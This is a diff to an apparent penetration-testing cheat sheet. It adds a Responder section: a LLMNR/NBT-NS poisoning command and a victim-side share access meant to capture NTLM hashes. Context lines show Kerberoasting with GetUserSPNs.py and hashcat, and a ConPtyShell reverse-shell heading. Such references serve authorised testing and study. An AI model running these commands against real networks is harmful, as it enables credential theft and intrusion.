@@ -12,6 +12,7 @@
 - [Kerberos](#kerberos)
 - [Ldap](#ldap)
 - [IMPACKET](#impacket)
+- [Responder](#responder)
 - [Exfiltration](#exfiltration)
 - [DMP File](#dmp-file)
 - [Virus](#virus)
@@ -200,6 +201,20 @@ python GetUserSPNs.py -dc-ip IP -outputfile KERBEROS_FILE_OUTPUT -request -debug
 hashcat -m 13100 --force -a 0 KERBEROS_FILE /usr/share/wordlists/rockyou.txt
 ```
 
+# Responder
+> Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. [source](https://github.com/lgandx/Responder)
+> Basicaly a rogue everything use for exemple to steal NLTLM Hash, usernames...
+
+Server (attacker) :
+```bash
+python Responder.py -I interface
+```
+
+Client (victim):
+```bash
+gci \\ip\test\test
+```
+
 ### GetNPUsers
 > [GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/GetNPUsers.py) will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set.
 
@@ -257,7 +272,7 @@ bulk_extractor -o bulk_output memory.dmp
 - [Cobalt Strike: Using Process Memory To Decrypt Traffic – Part 3](https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/)
 
 # Reverse shell
-## ConPtyShell
+### ConPtyShell
 > ConPtyShell is a Fully Interactive Reverse Shell for Windows systems. *[source](https://github.com/antonioCoco/ConPtyShell)*
 
 Server :
